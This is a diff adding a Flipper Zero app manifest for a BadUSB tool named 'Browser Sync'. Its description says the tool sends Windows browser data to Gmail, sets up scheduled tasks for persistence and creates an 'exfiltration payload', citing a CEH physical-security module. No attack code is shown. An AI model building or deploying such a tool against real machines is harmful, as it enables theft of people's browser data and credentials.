@@ -1,0 +1,21 @@
+App(
+    appid="browser_sync",
+    name="Browser Sync",
+    apptype=FlipperAppType.EXTERNAL,
+    entry_point="browser_sync_app",
+    cdefines=["APP_BROWSER_SYNC"],
+    requires=[
+        "gui",
+        "notification",
+        "storage",
+    ],
+    stack_size=4 * 1024,
+    order=25,
+    fap_icon="browser_sync_icon.png",
+    fap_category="BadUSB",
+    fap_description="Automated Windows browser data sync to Gmail with scheduled tasks. Prompts for Gmail credentials and creates persistent exfiltration payload. CEH Module 13 - Physical Security.",
+    fap_author="yogeshjoga",
+    fap_weburl="https://github.com/yogeshjoga/FlipperZero_BadUsb_Scripts",
+    fap_version="1.0",
+    fap_icon_assets="icons",
+)
